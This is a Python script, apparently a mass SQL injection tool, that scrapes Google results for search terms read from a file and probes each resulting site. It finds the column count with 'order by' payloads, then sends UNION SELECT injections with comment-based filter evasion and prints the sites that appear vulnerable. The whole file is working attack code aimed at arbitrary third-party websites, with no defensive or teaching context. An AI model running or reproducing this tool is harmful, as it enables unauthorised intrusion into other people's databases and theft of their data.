import re
import csv
import requests



colunas_da_tabela=1

def filtroGoogle(conteudo):
    organizar =[]
    f = open("google.com.csv", "a", encoding='UTF-8')
    writer = csv.writer(f, delimiter=",", lineterminator="\n")
    epilogo = re.compile("amp;url=(.*?)&amp;")
    """Serviços não filtrados :) """

    for i in epilogo.findall(conteudo):
        print(i)
        organizar = organizar + [i]

    quantidade = 1
    for remove_repetidos in list(set(organizar)):
        print(f"{[quantidade]}- Escrevendo :::: %s" % remove_repetidos)
        if remove_repetidos:
            writer.writerow([remove_repetidos])
        quantidade += 1


def getConectar(url):
    try:
        user_agent = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'}
        return requests.get(url, headers=user_agent)
    except requests.exceptions.ConnectionError as err:
        print(err)

def searchOnGoogle(txt):
    dominiosGOOGLE = [
        "google.com/search?"
    ]

    for dominios in range(len(dominiosGOOGLE)):
        try:
            for search in open(txt):
                ref= str(search).replace('\n', '')
                numero_pagina = f"&start={0}"
                html = getConectar(f"https://www.{dominiosGOOGLE[dominios]}q={ref}{numero_pagina}").text
                filtroGoogle(html)
        except Exception as cont:
            print(cont)







def colunas(pagina):
    colunas_da_tabela = 1
    while colunas_da_tabela < 21:
        order = f' {pagina} order by {colunas_da_tabela}'
        if getConectar(order).status_code   == 406:
            print(getConectar(order).text)
        elif getConectar(order).status_code == 200:
            print(order)
        if 'mysql_fetch_array()' in getConectar(order).text:
            print("[|||]- Quantidade de colunas:  %s" % colunas_da_tabela)
            break
        colunas_da_tabela += 1
    inject(pagina, colunas_da_tabela)


def inject(url, colunas):
    test = 666666666666666
    testeIN = []
    for i in range(1, colunas):
        testeIN.append(i)
    print("testando parametros")
    for ii in range(len(testeIN)):
        testeIN[ii] = test
        testeINJECT = f"{url[0:len(url) - 1]}null /**//*!12345UNION SELECT*//**/ {str(testeIN).replace('[', '').replace(']', '')}"
        if getConectar(testeINJECT).status_code == 406:
            print("acesso negad0")
        elif getConectar(testeINJECT).status_code == 200:
            if str(test) in getConectar(testeINJECT).text:
                print("[ o|==> ] ", testeINJECT)
        testeIN[ii] = ii + 1



def leitura(filecsv):
    with open(filecsv, encoding='UTF-8') as f:
        rows = csv.reader(f, lineterminator="\n")
        next(rows, None)
        for row in rows:
            pags = str(row[0])
            colunas(pags)

if __name__ == '__main__':
    searchOnGoogle("file.txt")
    leitura("google.com.csv")

